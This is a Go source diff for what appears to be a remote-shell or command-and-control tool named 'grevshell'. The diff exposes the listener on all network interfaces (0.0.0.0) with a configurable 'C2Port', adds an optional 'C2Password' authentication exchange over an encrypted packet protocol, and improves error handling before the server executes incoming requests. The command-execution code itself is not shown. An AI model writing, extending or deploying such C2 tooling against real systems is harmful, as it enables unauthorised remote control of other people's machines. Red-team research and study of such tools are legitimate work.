@@ -8,6 +8,7 @@ import (
 	"path/filepath"
 	"os"
 	"fmt"
+	"flag"
 	"bytes"
 	"net"
 	"os/exec"
@@ -15,8 +16,17 @@ import (
 	"grevshell/grevcore"
 )
 
+var (
+	C2Port		string
+	C2Password	string	
+)
 func main() {
-	stream, err := net.Listen("tcp", "localhost:9999")
+	flag.StringVar(&C2Port, "p", "9999", "Specify the listening port.")
+	flag.StringVar(&C2Password, "k", "", "Specify the authentication password.")
+
+	flag.Parse()
+
+	stream, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", C2Port))
 
 	if err != nil {
 		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
@@ -34,7 +44,7 @@ func main() {
 			continue
 		}
 
-		slog.Info(fmt.Sprintf("Incoming connection from %s.", conn.RemoteAddr()))
+		slog.Info("Incoming connection.", "REMOTE", conn.RemoteAddr())
 
 		key, err := grevcore.DeriveKey(conn)
 
@@ -43,8 +53,31 @@ func main() {
 			return
 		}
 
+		if C2Password != "" && ! ValidAuth(conn, C2Password, key) {
+			grevcore.SendPacket(conn, grevcore.Packet{grevcore.AuthFail, "", nil}, key)
+			slog.Error("Invalid authentication.", "REMOTE", conn.RemoteAddr())
+			continue
+		}
+
+		grevcore.SendPacket(conn, grevcore.PacketNil, key)
+		slog.Info("Successful Auth.", "REMOTE", conn.RemoteAddr())
+
 		ExecuteRequest(conn, key)
 	}
+}
+
+func ValidAuth(c net.Conn, C2Password string, key []byte) bool {
+	recv, err := grevcore.ReceivePacket(c, key)
+
+	if err != nil {
+		return false
+	}
+
+	if recv.Header != grevcore.AuthHeader {
+		return false
+	}
+
+	return string(recv.Data) == C2Password
 }
 
 func ExecuteRequest(c net.Conn, key []byte) {
@@ -54,9 +87,10 @@ func ExecuteRequest(c net.Conn, key []byte) {
 		var buf bytes.Buffer
 		var resp grevcore.Packet
 
-		recv := grevcore.ReceivePacket(c, key)
+		recv, err := grevcore.ReceivePacket(c, key)
 
-		if recv.Data == nil {
+		if err != nil {
+			slog.Error("An error occured while receiving the request.", slog.Any("ERROR", err))
 			return
 		}
 
